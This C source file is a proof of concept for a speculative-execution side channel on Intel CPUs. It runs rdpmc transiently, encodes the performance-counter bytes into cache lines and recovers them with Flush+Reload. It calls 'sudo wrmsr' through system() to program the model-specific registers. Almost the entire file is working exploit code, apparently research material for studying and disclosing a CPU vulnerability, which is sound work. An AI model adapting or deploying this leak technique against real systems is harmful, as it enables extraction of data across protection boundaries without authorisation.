#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <immintrin.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <asm/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#include "cacheutils.h"

//
// Code tested on: Intel Celeron J4005
//

#define SPACING 512
#define LEAKAGE_FAILED ((uint64_t)-1)

__attribute__((aligned(4096)))
char mem[8][SPACING * 300];
int init = 0;

void init_leak_pmc() {
  memset(mem, 1, sizeof(mem));
  CACHE_MISS = detect_flush_reload_threshold() + 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  init = 1;
}

__attribute__((aligned(4096)))
uint64_t leak_pmc() {
  if (!init) {
    printf("[!] Call init_leak_pmc() first!\n");
    exit(1);
  }


  int i, j;
  for (j = 0; j < 8; j++) {
    for (i = 0; i < 256; i++) {
      flush(mem[j] + i * SPACING);
    }
  }
  asm volatile("mfence");

  signal(SIGSEGV, trycatch_segfault_handler);

  for (size_t iterations = 0; iterations < 5; iterations++) {
    uint64_t low = 0, high = 0, try = 0;
    size_t start = rdtsc();

    do {
      for (int rep = 0; rep < 1; rep++) {
        if (!setjmp(trycatch_buf)) {
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          asm volatile ("imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n"
                        "imul %%rcx, %%rcx\n" : : "c"(7331) : "memory");
          asm volatile("xor %%ecx, %%ecx\n\t" // ATTENTION see [1]
                       "rdpmc\n\t"
                       : "=a"(low), "=d"(high)
                       : "c"(0) // ATTENTION see [1]
                       : "memory");
          // [1]: even though this two lines seem redundant they are important!
          //      both together prevent compiler optimizations that lead to longer data
          //      dependencies and prevent the leakage
          asm volatile(
          // byte 1
          "movq %%rax, %%r11\n\t"
          //"shr $8, %%r11\n\t"
          "and $0xff00, %%r11\n\t"
          "shl $1, %%r11\n\t"
          "addq %[mem1], %%r11\n\t"
          "movq $1336, 0(%%r11)\n\t"
          // byte 2
          "movq %%rax, %%r12\n\t"
          //"shr $16, %%r12\n\t"
          "and $0xff0000, %%r12\n\t"
          "shr $7, %%r12\n\t"
          "addq %[mem2], %%r12\n\t"
          "movq $1337, 0(%%r12)\n\t"
          // byte 3
          //"shr $24, %%eax\n\t"
          "and $0xff000000, %%eax\n\t"
          "shr $15, %%eax\n\t"
          "addq %%rax, %%rcx\n\t"
          "movq $1338, 0(%%rcx)\n\t"
          // byte 4
          "and $0xff, %%rdx\n\t"
          "shl $9, %%rdx\n\t"
          "addq %%rdx, %%rbx\n\t"
          "movq $1339, 0(%%rbx)\n\t"
          : : "a"(low), "d"(high), "c"(&mem[3]), "b"(&mem[4]), [mem2]"r"(&mem[2]), [mem1]"r"(&mem[1])
          : "memory", "r11", "r12");

          try_abort();
        }
      }

      int hits = 0;
      uint64_t recovered = 0;
      int bytes_to_leak = 4;
      for (j = 1; j < 5; j++) {
        for (i = 1; i < 255; i++) {
          size_t idx = ((i * 167u) + 13u) & 255u;
          size_t delta = flush_reload_t(mem[j] + idx * SPACING);
          if (delta < CACHE_MISS) {
            //printf("Got hit in try%d\n", try);
            recovered |= idx * ((uint64_t) 1 << (j * 8));
            hits++;
            break;
          }
        }
      }
      if (hits == bytes_to_leak) {
        return recovered;
      }

      try++;
    } while (try < 50);

    size_t end = rdtsc();
    return LEAKAGE_FAILED;
  }
}


void start_performance_counter() {
  system("sudo modprobe msr");

  // enable event "Instructions Retired" -> UMASK (0x00) | EVENTSEL (0xC0)
  system("sudo wrmsr -a 0x186 0x4100C0");

  // enable PMC0
  system("sudo wrmsr -a 0x38f 0x1");
}

void stop_performance_counter() {
  //system("sudo modprobe msr");

  system("sudo wrmsr -a 0x186 0x0");
  system("sudo wrmsr -a 0x38f 0x0");
}

void libsc_pin_to_core(pid_t pid, int core) {
  cpu_set_t mask;
  mask.__bits[0] = 1 << core;
  sched_setaffinity(pid, sizeof(cpu_set_t), &mask);
}

int main(int argc, char* argv[]) {
  if (geteuid() != 0) {
    printf("\033[91m[!] PoC needs root to program performance counters\033[0m\n");
    return 1;
  }
  libsc_pin_to_core(0, 1);



  start_performance_counter();

  init_leak_pmc();


  for (size_t i = 0; i < 10; i++) {
    uint64_t pmc_val = leak_pmc();
    if (pmc_val == LEAKAGE_FAILED) {
      printf("\033[93m[-] Leakage failed. Retry.\033[0m\n");
      continue;
    }
    // attention: this implementation does not leak the lower 8 bits
    printf("\033[92m[+] PMC (Instructions Retired): 0x%lxXX\033[0m\n", pmc_val >> 8);
    usleep(5000);
  }

  stop_performance_counter();
  return 0;
}
